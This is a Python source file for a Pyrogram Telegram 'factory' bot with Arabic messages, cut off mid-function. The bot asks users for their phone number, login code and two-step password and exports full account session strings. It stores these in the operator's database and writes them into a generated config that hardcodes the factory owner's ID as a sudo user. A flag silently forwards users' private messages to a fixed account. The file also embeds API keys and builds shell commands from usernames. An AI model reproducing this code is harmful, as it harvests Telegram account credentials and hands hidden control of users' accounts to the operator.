import asyncio
import os
import re
import shutil
import sys
import psutil
from typing import List, Union, Callable
from os import execle, environ
from pyrogram.errors import FloodWait, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded
from redis import Redis
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message, InlineKeyboardMarkup, InlineKeyboardButton

# BY ANUBIS ~> Vars #
bot = Client("Factory", 3656868, "3911d017831e5325cf9f02edbb3bcae1")
db = Redis(
    host='127.0.0.1',
    port=6379,
    charset='utf-8',
    decode_responses=True
)
clients = {}
Sudo_id = 8252254314
Dev_ids = [Sudo_id, 8252254314,]


# BY ANUBIS ~> Functions #
def Make_Config(cl, client, session_string, token):
    with open(f"./{cl.me.username}/config.py", "w") as file:
        file.write(f"""# BY ANUBIS #
from pyrogram import Client,filters,enums
import redis
r = redis.Redis(host="127.0.0.1", port=6379, charset="utf-8", decode_responses=True)          
sudo_id = {client.me.id}
bot_user = "{cl.me.username}"
api_id = 10823881
api_hash = "339886e2109eb67203ce12022b32e035"
session = "{session_string}"
token = "{token}"
sudo_command = [8252254314]
pm = "{client.me.id}"
mention = "{client.me.id}"
plugins = dict(root="plugins")
app = Client("user:{cl.me.username}",api_id , api_hash ,in_memory=True,session_string = session, plugins=plugins) 
bot = Client("{cl.me.username}",api_id=api_id , api_hash=api_hash , bot_token=token,plugins=dict(root="plug_bot"))
"""
                   )


def bot_screen_running(user):
    list_ = []
    for screen in os.listdir("/var/run/screen/S-root"):
        if re.search('[Bb][Oo][Tt]', screen):
            string = screen.split('.')[1]
            list_.append(string.lower())
    if user.lower() in list_:
        return True


def save_install_data(c, bot_token, bot_user, sudo_id):
    bot_id = c.me.id
    db.sadd(f"{bot_id}:users:", sudo_id)
    db.set(f"{bot_id}:user_bot_token:{sudo_id}", bot_token)
    db.set(f"{bot_id}:bot_owner:{bot_token}", sudo_id)
    db.set(f"{bot_id}:user_bot_username:{sudo_id}", bot_user)


def is_sudo(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id == Sudo_id:
            return await func(client, message)
        elif message.from_user.id in Dev_ids:
            return await func(client, message)

    return decorator


# BY ANUBIS ~> Member commands #

@bot.on_message(filters.private & filters.text & ~filters.user(Dev_ids))
async def Main(c, m):
    bot_id = c.me.id
    if db.get(f"{c.me.id}:twsl") == "on":
       try:
         await m.forward("Ues_steven")
       except:
          pass
    from_id = m.from_user.id if m.from_user.id else None
    if m.text:
        t = m.text
    else:
        t = None

    if m.from_user.id not in Dev_ids:

        if t and not db.get(f"{bot_id}:free_mod:"):
            await m.reply("**~ الوضع المجاني معطل للاسف**")
            return

        if t == "الغاء":
            db.delete(f"{bot_id}:phone_code_hash:{from_id}")
            db.delete(f"{bot_id}:phone_number:{from_id}")
            db.delete(f"{bot_id}:start_make:{from_id}")
            try:
                os.remove(f"BT{from_id}.session")
                os.remove(f"SS{from_id}.session")
            except Exception:
                pass
            await m.reply(
                "~ تم الالغاء مرحبا بك تاني.",
                reply_markup=ReplyKeyboardMarkup(
                    [
                        [
                            KeyboardButton("اصنع الان"), KeyboardButton("احذف الان")
                        ]
                    ],
                    resize_keyboard=True
                )
            )

        if t == "/start":
            if not db.sismember(f"{bot_id}:start_users:", from_id):
                db.sadd(f"{bot_id}:start_users:", from_id)
            db.delete(f"{bot_id}:start_make:{from_id}")
            await m.reply_text("**This edit was submitted by @Ues_steven**",
                reply_markup=ReplyKeyboardMarkup(
                    [
                        [
                            KeyboardButton("اصنع الان"), KeyboardButton("احذف الان")
                        ]
                    ],
                    resize_keyboard=True
                )
            )
            await m.reply_video(video="https://t.me/lkkkkkli/12",
                caption=f"""• مـرحبـا بك يـا : {m.from_user.mention}
في الصـانع الخـاص بسوبر استيفن 
— — — — — — — — —
• َِρَِᖇَِ᥆ َِ᥉َِ᥆َِꪊَِᖇَِᥴُِ꧖ : @G_g_h_u
• َِ᥉ُِ᥆ُِᥙَِᖇُِᥴُِᥱ ُِᥴَِɦُِᥲَِꪀَِꪀُِᥱَِᥣ : @Hx_x0
اذا اردت تنصيب حسابك قـم بالضغط عـلي زر التنصيب الان بالاسفل واتبع الخطوات كما هو موضح لك""",
                reply_markup=InlineKeyboardMarkup(
                [
                  [
                    InlineKeyboardButton('ᥴɦᥲꪀᥲᥣ ᥉᥆ᥙᖇᥴᥱ', url=f'https://t.me/Hx_x0'),
                    InlineKeyboardButton('؍`𝐬𝐭𝐞𝐯𝐞𝐧 ٭', url=f'https://t.me/Ues_steven')
                  ]
                ]))

        if t == "احذف الان":
            if not db.sismember(f"{bot_id}:users:", from_id):
                await m.reply("انت مش منصب اصلا")
                return
            msg = await m.reply("برجاء الانتظار..")
            bot_token = db.get(f"{bot_id}:user_bot_token:{from_id}")
            bot_sudo_id = db.get(f"{bot_id}:bot_owner:{bot_token}")
            user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
            shutil.rmtree(f"./{user_bot_username}")
            os.system(f"screen -X -S {user_bot_username} quit")
            await msg.edit("تم حذف التنصيب بنجاح")
            db.srem(f"{bot_id}:users:", from_id)
            db.delete(f"{bot_id}:user_bot_token:{from_id}")
            db.delete(f"{bot_id}:bot_owner:{bot_token}")
            db.delete(f"{bot_id}:user_bot_username:{bot_sudo_id}")

        if t == "اصنع الان":
            if db.sismember(f"{bot_id}:users:", from_id):
                msg = await m.reply("انت منصب قبل كدا")
                return
            db.set(f"{bot_id}:start_make:{from_id}", "Send Number")
            try:
                os.remove(f"BT{from_id}.session")
                os.remove(f"SS{from_id}.session")
            except Exception:
                pass
            await m.reply(
                (
                    "**دلوقتي ابعت رقمك بالصيغه الدوليه.**"
                    "\n\n"
                    "مثال : `+201270`"
                ),
                reply_markup=ReplyKeyboardMarkup(
                    [
                        [
                            KeyboardButton("الغاء")
                        ]
                    ],
                    resize_keyboard=True,
                )
            )
            return
        if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Number":
            msg = await m.reply("برجاء الانتظار..")
            db.set(f"{bot_id}:start_make:{from_id}", "Send Code")
            try:
                client = Client(f"SS{from_id}", api_id=3656868, api_hash="3911d017831e5325cf9f02edbb3bcae1")
            except Exception as e:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit(f"**خطأأ :** `{str(e)}`\nدوس /start عشان تبدأ من جديد")
                return
            try:
                await client.connect()
            except ConnectionError:
                await client.disconnect()
                await client.connect()
            try:
                code = await client.send_code(t)
                await asyncio.sleep(1)
            except FloodWait as e:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit(f"انت بالع ابطاء استنا {e.x} ثانيه")
                return
            except PhoneNumberInvalid:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit("رقم التلفون غلط ابدء من جديد \n /start")
                return
            try:
                db.set(f"{bot_id}:phone_code_hash:{from_id}", code.phone_code_hash)
                db.set(f"{bot_id}:phone_number:{from_id}", t)
                clients[f"CL_{from_id}"] = client
                await msg.delete()
                msg = await m.reply_photo("https://telegra.ph/file/0e9a66082ad3fa4342ebd.jpg",
                    caption="""في كود وصلك من التليجرام هاتو
بس هاتو كدا ( 1 2 3 4 5 6 ) لازم مسافات بين الارقام
لو الكود موصلش ابدء من جديد :
/start""",
                    reply_markup=ReplyKeyboardMarkup(
                        [
                            [
                                KeyboardButton("الغاء")
                            ]
                        ],
                        resize_keyboard=True
                    )
                )
            except TimeoutError:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await m.reply("يعم انجز حالك بسرعه\nدوس /start عشان تبدء من جديد")
                return
            return
        if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Code":
            msg = await m.reply("برجاء الانتظار..")
            phone_code_hash = db.get(f"{bot_id}:phone_code_hash:{from_id}")
            phone = db.get(f"{bot_id}:phone_number:{from_id}")
            client = clients[f"CL_{from_id}"]
            try:
                await client.sign_in(phone, phone_code_hash, phone_code=' '.join(str(t)))
            except PhoneCodeInvalid:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit("الكود غلط\n\nدوس /start عشان تبدء من جديد")
                return
            except PhoneCodeExpired:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit("الكود خلص\n\nدوس /start عشان تبدء من جديد")
                return
            except SessionPasswordNeeded:
                try:
                    db.set(f"{bot_id}:start_make:{from_id}", "Send Password")
                    await msg.edit(
                        "الاكونت بتاعك محمي بباسورد\nابعت الباسورد ناو\n\nدوس /cancel للانهاء",
                        reply_markup=ReplyKeyboardMarkup(
                            [
                                [
                                    KeyboardButton("الغاء")
                                ]
                            ],
                            resize_keyboard=True
                        )
                    )
                    return
                except TimeoutError:
                    db.delete(f"{bot_id}:start_make:{from_id}")
                    await msg.edit("انت خدت حاولت كتير استني 5 دقايق\nدوس /start عشان تبدء من جديد")
                    return
            try:
                session_string = await client.export_session_string()
                db.set(f"{bot_id}:start_make:{from_id}", "Send BotToken")
                db.set(f"{bot_id}:session_string:{from_id}", session_string)
                await msg.edit("ابعت توكن البوت المساعد.")
                await client.disconnect()
                db.delete(f"{bot_id}:phone_code_hash:{from_id}")
                db.delete(f"{bot_id}:phone_number:{from_id}")
            except Exception as e:
                await bot.send_message(m.chat.id, f"**خطأ:** `{str(e)}`")
                return
            return

        if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Password":
            msg = await m.reply("برجاء الانتظار..")
            db.delete(f"{bot_id}:phone_code_hash:{from_id}")
            db.delete(f"{bot_id}:phone_number:{from_id}")
            client = clients[f"CL_{from_id}"]
            try:
                await client.check_password(t)
            except Exception as e:
                await msg.edit(f"**خطأ :** `{str(e)}`")
                return
            try:
                session_string = await client.export_session_string()
                db.set(f"{bot_id}:start_make:{from_id}", "Send BotToken")
                db.set(f"{bot_id}:session_string:{from_id}", session_string)
                await msg.edit("ابعت توكن البوت المساعد \nاحصل عليه من هنا @BotFather")
                await client.disconnect()
            except Exception as e:
                await msg.edit(m.chat.id, f"**خطأ:** `{str(e)}`")
                return
            return

        if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send BotToken":
            msg = await m.reply("جاري تشغيل حسابك..")
            cl = Client(f"BT{from_id}", api_id=3656868, api_hash="3911d017831e5325cf9f02edbb3bcae1", bot_token=t)
            client = clients[f"CL_{from_id}"]
            try:
                try:
                    await cl.start()
                except Exception as e:
                    await m.reply("التوكن غلط اتاكد منه.")
                await client.start()
                session_string = db.get(f"{bot_id}:session_string:{from_id}")
                os.system(f'cp -a ./source/. ./{cl.me.username}')
                Make_Config(cl, client, session_string, t)
                save_install_data(c, t, cl.me.username, client.me.id)
                await cl.stop()
                await client.stop()
                os.system(f'cd {cl.me.username} &&chmod +x * && screen -d -m -S {cl.me.username} python3 user.py')
                await msg.edit("تم تشغيل الحساب بنجاح")
                os.remove(f"BT{from_id}.session")
                os.remove(f"SS{from_id}.session")
                db.delete(f"{bot_id}:start_make:{from_id}")
                return
            except Exception as e:
                print(e)
                await msg.edit(m.chat.id, f"**خطأ:** `{str(e)}`")
                return


# BY ANUBIS ~> Sudo commands #

@bot.on_message(filters.private & filters.command("start"))
@is_sudo
async def Sudo_Start(c, m):
    bot_id = c.me.id
    #######
    db.delete(f"{bot_id}:add_user:{m.from_user.id}")
    db.delete(f"{bot_id}:delete_user:{m.from_user.id}")
    ######
    factory_users = db.smembers(f"{bot_id}:users:")
    users_num = len(factory_users)
    start_user = db.smembers(f"{bot_id}:start_users:")
    start_user_num = len(start_user)
    free_mod = "✅" if db.get(f"{bot_id}:free_mod:") else "❎"
    await m.reply(
        (
            "~ مرحبا بك عزيزي المطور."
            "\n\n"
            "--معلومات مصنعك-- :"
            "\n"
            "- العدد الكلي لمستخدمين المصنع : "
            f"`{start_user_num}`"
            "\n"
            "- عدد المنصبين علي المصنع : "
            f"`{users_num}`"
            "\n"
            "- الوضع المجاني : "
            f"{free_mod}"
            "\n."
        ),
        reply_markup=ReplyKeyboardMarkup(
            [
                [
                    KeyboardButton("اصنع"), KeyboardButton("احذف")
                ],
                [
                    KeyboardButton("تشغيل بوت"), KeyboardButton("ايقاف بوت")
                ],
                [
                    KeyboardButton("تفعيل الوضع المجاني"), KeyboardButton("تعطيل الوضع المجاني")
                ],
                [
                    KeyboardButton("تشغيل البوتات"), KeyboardButton("تحديث المصنوعات")
                ],
                [
                    KeyboardButton("الاسكرينات المفتوحه"), KeyboardButton("معلومات تنصيب")
                ],
                [
                    KeyboardButton("المشتركين"), KeyboardButton("اذاعه")
                ],
                [
                    KeyboardButton("تحديث المصنع")
                ]
            ],
            resize_keyboard=True
        )
    )

@bot.on_message(filters.private & filters.regex("^تعطيل التواصل"))
@is_sudo
async def oftwsl(c, m):
    db.set(f"{c.me.id}:twsl", "off")
    await m.reply("**تم تعطيل التواصل**")

@bot.on_message(filters.private & filters.regex("^تفعيل التواصل"))
@is_sudo
async def ontwsl(c, m):
    db.set(f"{c.me.id}:twsl", "on")
    await m.reply("**تم تفعيل التواصل**")

@bot.on_message(filters.private & filters.regex("^اصنع"))
@is_sudo
async def add_user(c, m):
    bot_id = c.me.id
    db.set(f"{bot_id}:add_user:{m.from_user.id}", "send id")
    await m.reply("**~ ارسل ايدي العضو.**")


@bot.on_message(filters.private & filters.regex("^احذف"))
@is_sudo
async def delete_user(c, m):
    await m.reply(
        "**~ اختر كيف تريد حذف التنصيب :**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('بايدي المستخدم 🆔', callback_data=f'rem_by_sudoid'),
                    InlineKeyboardButton('بتوكن البوت 🤖', callback_data=f'rem_by_token')
                ]
            ]
        )
    )


@bot.on_callback_query(filters.regex("^rem_by_sudoid"))
async def delete_user_by_sudoid(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:delete_user:{q.from_user.id}", "by sudo id")
    await q.message.edit("**~ ارسل الايدي الان.**")


@bot.on_callback_query(filters.regex("^rem_by_token"))
async def delete_user_by_token(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:delete_user:{q.from_user.id}", "by bot token")
    await q.message.edit("**~ ارسل التوكن الان.**")

# stop bot #
@bot.on_message(filters.private & filters.regex("^ايقاف بوت"))
@is_sudo
async def stop_user(c, m):
    await m.reply(
        "**~ اختر كيف تريد ايقاف التنصيب :**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('بايدي المستخدم 🆔', callback_data=f'stop_by_sudoid'),
                    InlineKeyboardButton('بتوكن البوت 🤖', callback_data=f'stop_by_token')
                ]
            ]
        )
    )


@bot.on_callback_query(filters.regex("^stop_by_sudoid"))
async def stop_user_by_sudoid(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:stop_user:{q.from_user.id}", "by sudo id")
    await q.message.edit("**~ ارسل الايدي الان.**")


@bot.on_callback_query(filters.regex("^stop_by_token"))
async def stop_user_by_token(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:stop_user:{q.from_user.id}", "by bot token")
    await q.message.edit("**~ ارسل التوكن الان.**")


# start bot #
@bot.on_message(filters.private & filters.regex("^تشغيل بوت"))
@is_sudo
async def start_user(c, m):
    await m.reply(
        "**~ اختر كيف تريد تشغيل التنصيب :**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('بايدي المستخدم 🆔', callback_data=f'start_by_sudoid'),
                    InlineKeyboardButton('بتوكن البوت 🤖', callback_data=f'start_by_token')
                ]
            ]
        )
    )


@bot.on_callback_query(filters.regex("^start_by_sudoid"))
async def start_user_by_sudoid(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:start_user:{q.from_user.id}", "by sudo id")
    await q.message.edit("**~ ارسل الايدي الان.**")


@bot.on_callback_query(filters.regex("^start_by_token"))
async def start_user_by_token(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:start_user:{q.from_user.id}", "by bot token")
    await q.message.edit("**~ ارسل التوكن الان.**")


# Info bot #
@bot.on_message(filters.private & filters.regex("^معلومات تنصيب"))
@is_sudo
async def get_info_user(c, m):
    await m.reply(
        "**~ اختر كيف تريد جلب المعلومات :**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('بايدي المستخدم 🆔', callback_data=f'info_by_sudoid'),
                    InlineKeyboardButton('بتوكن البوت 🤖', callback_data=f'info_by_token')
                ]
            ]
        )
    )


@bot.on_callback_query(filters.regex("^info_by_sudoid"))
async def info_user_by_sudoid(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:info_user:{q.from_user.id}", "by sudo id")
    await q.message.edit("**~ ارسل الايدي الان.**")


@bot.on_callback_query(filters.regex("^info_by_token"))
async def info_user_by_token(c, q):
    bot_id = c.me.id
    db.set(f"{bot_id}:info_user:{q.from_user.id}", "by bot token")
    await q.message.edit("**~ ارسل التوكن الان.**")



@bot.on_message(filters.private & filters.regex("^الاسكرينات المفتوحه"))
@is_sudo
async def num_screen(c, m):
    n = 0
    message = "**~ الاسكرينات المفتوحه :\n**"
    for screen in os.listdir("/var/run/screen/S-root"):
        n += 1
        message += f"{n} - ( `{screen}` )\n"
    await m.reply(message)


@bot.on_message(filters.private & filters.regex("^تحديث المصنوعات"))
@is_sudo
async def update_users(c, m):
    n = 0
    msg = await m.reply("**~ جاري تحديث المصنوعات :\n**")
    for folder in os.listdir():
        if re.search('[Bb][Oo][Tt]', folder):
            os.system("rm -fr ./" + folder + "/plugins/*")
            os.system("rm -fr ./" + folder + "/plug_bot/*")
            os.system(
                'cp -a ./update/. ./' + folder + ' && cd ' + folder + ' && chmod +x * && screen -X -S ' + folder.replace(
                    "@", "") + ' quit && screen -d -m -S ' + folder.replace("@", "") + ' python3 user.py')
            n += 1
            await msg.edit(
                (
                    "**~ جاري تحديث المصنوعات :\n**"
                    "- تم تحديث : "
                    f"`{n}`"
                    " يوزر"
                )
            )
    os.system("rm -fr ./source/*")
    os.system('cp -a ./update/. ./source')
    await msg.edit("**~ تم تحديث المصنوعات.**")


@bot.on_message(filters.private & filters.regex("^تشغيل البوتات"))
@is_sudo
async def start_Allusers(c, m):
    n = 0
    msg = await m.reply("**~ جاري تشغيل البوتات :\n**")
    for folder in os.listdir():
        if re.search('[Bb][Oo][Tt]', folder):
            os.system('cd ' + folder + ' && chmod +x * && screen -X -S ' + folder.replace("@", "") + ' quit && screen -d -m -S ' + folder.replace("@", "") + ' python3 user.py')
            n += 1
            await msg.edit(
                (
                    "**~ جاري تشغيل البوتات :\n**"
                    "- تم تشغيل : "
                    f"`{n}`"
                    " يوزر"
                )
            )
    await msg.edit("**~ تم تشغيل البوتات.**")


@bot.on_message(filters.private & filters.regex("^تفعيل الوضع المجاني"))
@is_sudo
async def enable_free_mod(c, m):
    bot_id = c.me.id
    db.set(f"{bot_id}:free_mod:", "true")
    await m.reply("**~ تم تفعيل الوضع المجاني.**")


@bot.on_message(filters.private & filters.regex("^تعطيل الوضع المجاني"))
@is_sudo
async def disable_free_mod(c, m):
    bot_id = c.me.id
    db.delete(f"{bot_id}:free_mod:")
    await m.reply("**~ تم تعطيل الوضع المجاني.**")


@bot.on_message(filters.private & filters.regex("^تحديث المصنع"))
@is_sudo
async def update_factory(c, m):
    await m.reply("جاري تحديث المصنع...")
    args = [sys.executable, "main.py"]
    execle(sys.executable, *args, environ)


@bot.on_message(filters.private & filters.text)
@is_sudo
async def MainSudo(c, m):
    bot_id = c.me.id
    from_id = m.from_user.id if m.from_user.id else None
    if m.text:
        t = m.text
    else:
        t = None

    if t and db.get(f"{bot_id}:add_user:{from_id}") == "send id":
        db.delete(f"{bot_id}:add_user:{from_id}")
        if db.sismember(f"{bot_id}:users:", t):
            await m.reply("الراجل منصب عنك اصلا.")
            return
        db.set(f"{bot_id}:start_make:{from_id}", "Send Number")
        db.set(f"{bot_id}:add_user_id:{from_id}", t)
        try:
            os.remove(f"BT{t}.session")
            os.remove(f"SS{t}.session")
        except Exception:
            pass
        await m.reply(
            (
                "**دلوقتي ابعت الرقم بالصيغه الدوليه.**"
                "\n\n"
                "مثال : `+201060783431`"
            ),
            reply_markup=ReplyKeyboardMarkup(
                [
                    [
                        KeyboardButton("الغاء")
                    ]
                ],
                resize_keyboard=True,
            )
        )
        return

    if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Number":
        msg = await m.reply("برجاء الانتظار..")
        db.set(f"{bot_id}:start_make:{from_id}", "Send Code")
        add_user_id = db.get(f"{bot_id}:add_user_id:{from_id}")
        try:
            client = Client(f"SS{add_user_id}", api_id=3656868, api_hash="3911d017831e5325cf9f02edbb3bcae1")
        except Exception as e:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await msg.edit(f"**خطأأ :** `{str(e)}`\nدوس /start عشان تبدأ من جديد")
            return
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        try:
            code = await client.send_code(t)
            await asyncio.sleep(1)
        except FloodWait as e:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await msg.edit(f"انت بالع ابطاء استنا {e.x} ثانيه")
            return
        except PhoneNumberInvalid:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await msg.edit("رقم التلفون غلط ابدء من جديد \n /start")
            return
        try:
            db.set(f"{bot_id}:phone_code_hash:{from_id}", code.phone_code_hash)
            db.set(f"{bot_id}:phone_number:{from_id}", t)
            clients[f"CL_{from_id}"] = client
            await msg.edit(
                (
                    "في كود وصلك من التليجرام هاتو"
                    "\n"
                    "بس هاتو كدا ( **1 2 3 4 5 6** ) لازم مسافات بين الارقام"
                    "\n"
                    "لو الكود موصلش ابدء من جديد :"
                    "\n"
                    "/start"
                ),
                reply_markup=ReplyKeyboardMarkup(
                    [
                        [
                            KeyboardButton("الغاء")
                        ]
                    ],
                    resize_keyboard=True
                )
            )
        except TimeoutError:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await m.reply("يعم انجز حالك بسرعه\nدوس /start عشان تبدء من جديد")
            return
        return

    if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Code":
        msg = await m.reply("برجاء الانتظار..")
        phone_code_hash = db.get(f"{bot_id}:phone_code_hash:{from_id}")
        phone = db.get(f"{bot_id}:phone_number:{from_id}")
        client = clients[f"CL_{from_id}"]
        try:
            await client.sign_in(phone, phone_code_hash, phone_code=' '.join(str(t)))
        except PhoneCodeInvalid:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await msg.edit("الكود غلط\n\nدوس /start عشان تبدء من جديد")
            return
        except PhoneCodeExpired:
            db.delete(f"{bot_id}:start_make:{from_id}")
            await msg.edit("الكود خلص\n\nدوس /start عشان تبدء من جديد")
            return
        except SessionPasswordNeeded:
            try:
                db.set(f"{bot_id}:start_make:{from_id}", "Send Password")
                await msg.edit(
                    "الاكونت بتاعك محمي بباسورد\nابعت الباسورد ناو\n\nدوس /cancel للانهاء",
                    reply_markup=ReplyKeyboardMarkup(
                        [
                            [
                                KeyboardButton("الغاء")
                            ]
                        ],
                        resize_keyboard=True
                    )
                )
                return
            except TimeoutError:
                db.delete(f"{bot_id}:start_make:{from_id}")
                await msg.edit("انت خدت حاولت كتير استني 5 دقايق\nدوس /start عشان تبدء من جديد")
                return
        try:
            session_string = await client.export_session_string()
            db.set(f"{bot_id}:start_make:{from_id}", "Send BotToken")
            db.set(f"{bot_id}:session_string:{from_id}", session_string)
            await msg.edit("ابعت توكن البوت المساعد.")
            await client.disconnect()
            db.delete(f"{bot_id}:phone_code_hash:{from_id}")
            db.delete(f"{bot_id}:phone_number:{from_id}")
        except Exception as e:
            await bot.send_message(m.chat.id, f"**خطأ:** `{str(e)}`")
            return
        return

    if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send Password":
        msg = await m.reply("برجاء الانتظار..")
        db.delete(f"{bot_id}:phone_code_hash:{from_id}")
        db.delete(f"{bot_id}:phone_number:{from_id}")
        client = clients[f"CL_{from_id}"]
        try:
            await client.check_password(t)
        except Exception as e:
            await msg.edit(f"**خطأ :** `{str(e)}`")
            return
        try:
            session_string = await client.export_session_string()
            db.set(f"{bot_id}:start_make:{from_id}", "Send BotToken")
            db.set(f"{bot_id}:session_string:{from_id}", session_string)
            await msg.edit("ابعت توكن البوت المساعد.")
            await client.disconnect()
        except Exception as e:
            await msg.edit(m.chat.id, f"**خطأ:** `{str(e)}`")
            return
        return

    if t and db.get(f"{bot_id}:start_make:{from_id}") == "Send BotToken":
        msg = await m.reply("جاري تشغيل حسابك..")
        add_user_id = db.get(f"{bot_id}:add_user_id:{from_id}")
        cl = Client(f"BT{add_user_id}", api_id=3656868, api_hash="3911d017831e5325cf9f02edbb3bcae1", bot_token=t)
        client = clients[f"CL_{from_id}"]
        try:
            try:
                await cl.start()
            except Exception as e:
                await m.reply("التوكن غلط اتاكد منه.")
            await client.start()
            session_string = db.get(f"{bot_id}:session_string:{from_id}")
            os.system(f'cp -a ./source/. ./{cl.me.username}')
            Make_Config(cl, client, session_string, t)
            save_install_data(c, t, cl.me.username, client.me.id)
            await cl.stop()
            await client.stop()
            os.system(f'cd {cl.me.username} &&chmod +x * && screen -d -m -S {cl.me.username} python3 user.py')
            await msg.edit("تم تشغيل الحساب بنجاح")
            os.remove(f"BT{add_user_id}.session")
            os.remove(f"SS{add_user_id}.session")
            db.delete(f"{bot_id}:start_make:{from_id}")
            return
        except Exception as e:
            print(e)
            await msg.edit(m.chat.id, f"**خطأ:** `{str(e)}`")
            return

    # delete user #
    if t and db.get(f"{bot_id}:delete_user:{from_id}") == "by sudo id":
        db.delete(f"{bot_id}:delete_user:{from_id}")
        if not db.sismember(f"{bot_id}:users:", t):
            await m.reply("الراجل مش منصب عنك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        try:
            info = await c.get_chat(t)
            tag = f"[{info.first_name}](tg://user?id={t})"
        except:
            tag = f"[NONE](tg://user?id={t})"
        bot_token = db.get(f"{bot_id}:user_bot_token:{t}")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{bot_token}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        shutil.rmtree(f"./{user_bot_username}")
        os.system(f"screen -X -S {user_bot_username} quit")
        await msg.edit(
            "**~ تم حذف التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"{user_bot_username}"
        )
        db.srem(f"{bot_id}:users:", t)
        db.delete(f"{bot_id}:user_bot_token:{t}")
        db.delete(f"{bot_id}:bot_owner:{bot_token}")
        db.delete(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        return

    if t and db.get(f"{bot_id}:delete_user:{from_id}") == "by bot token":
        db.delete(f"{bot_id}:delete_user:{from_id}")
        if not db.get(f"{bot_id}:bot_owner:{t}"):
            await m.reply("الراجل مش منصب عنك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{t}")
        bot_token = db.get(f"{bot_id}:user_bot_token:{bot_sudo_id}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(bot_sudo_id)
            tag = f"[{info.first_name}](tg://user?id={bot_sudo_id})"
        except:
            tag = f"[NONE](tg://user?id={bot_sudo_id})"
        shutil.rmtree(f"./{user_bot_username}")
        os.system(f"screen -X -S {user_bot_username} quit")
        await msg.edit(
            "**~ تم حذف التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"{user_bot_username}"
        )
        db.srem(f"{bot_id}:users:", bot_sudo_id)
        db.delete(f"{bot_id}:user_bot_token:{bot_sudo_id}")
        db.delete(f"{bot_id}:bot_owner:{bot_token}")
        db.delete(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        return
    
    # stop bot #
    if t and db.get(f"{bot_id}:stop_user:{from_id}") == "by sudo id":
        db.delete(f"{bot_id}:stop_user:{from_id}")
        if not db.sismember(f"{bot_id}:users:", t):
            await m.reply("الراجل مش منصب عندك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        try:
            info = await c.get_chat(t)
            tag = f"[{info.first_name}](tg://user?id={t})"
        except:
            tag = f"[NONE](tg://user?id={t})"
        bot_token = db.get(f"{bot_id}:user_bot_token:{t}")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{bot_token}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        os.system(f"screen -X -S {user_bot_username} quit")
        await msg.edit(
            "**~ تم ايقاف التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"{user_bot_username}"
        )
        return

    if t and db.get(f"{bot_id}:stop_user:{from_id}") == "by bot token":
        db.delete(f"{bot_id}:stop_user:{from_id}")
        if not db.get(f"{bot_id}:bot_owner:{t}"):
            await m.reply("الراجل مش منصب عندك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{t}")
        bot_token = db.get(f"{bot_id}:user_bot_token:{bot_sudo_id}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(bot_sudo_id)
            tag = f"[{info.first_name}](tg://user?id={bot_sudo_id})" 
        except:
            tag = f"[NONE](tg://user?id={bot_sudo_id})"
        os.system(f"screen -X -S {user_bot_username} quit")
        await msg.edit(
            "**~ تم ايقاف التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
